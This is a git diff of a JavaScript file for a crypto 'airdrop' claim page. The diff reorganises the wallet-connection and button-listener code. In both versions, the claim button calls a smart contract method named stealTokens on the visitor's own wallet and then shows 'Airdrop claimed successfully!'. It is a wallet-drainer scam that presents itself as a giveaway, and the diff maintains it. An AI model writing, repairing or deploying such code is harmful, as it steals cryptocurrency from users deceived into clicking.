@@ -1,6 +1,6 @@
-// Ensure that accounts is properly initialized
-let accounts = [];
+// eth.js
 
+// Function to claim the airdrop
 async function claimAirdrop() {
     if (accounts.length === 0) {
         alert('Please connect to a wallet first!');
@@ -15,7 +15,7 @@ async function claimAirdrop() {
     const contract = new web3.eth.Contract(contractABI, contractAddress);
     try {
         console.log('Claiming airdrop...');
-        // Ensure that accounts are being accessed correctly
+        // Use the globally defined accounts
         await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
         alert('Airdrop claimed successfully!');
     } catch (error) {
@@ -24,19 +24,15 @@ async function claimAirdrop() {
     }
 }
 
-// Ensure that accounts are fetched properly on page load
-window.addEventListener('DOMContentLoaded', (event) => {
-    if (web3 && window.ethereum) {
-        window.ethereum.request({ method: 'eth_requestAccounts' })
-            .then((userAccounts) => {
-                accounts = userAccounts; // Set accounts here
-                console.log('Accounts:', accounts);
-                document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
-                document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-            })
-            .catch((error) => {
-                console.error('Failed to get accounts:', error);
-            });
+// Attach the event listener for the claim button
+window.addEventListener('DOMContentLoaded', () => {
+    const claimButton = document.getElementById('claimAirdropButton');
+    if (claimButton) {
+        claimButton.disabled = false; // Enable the button when DOM is loaded
+        claimButton.addEventListener('click', claimAirdrop);
+    } else {
+        console.error("Claim button with ID 'claimAirdropButton' not found.");
     }
 });
+
 
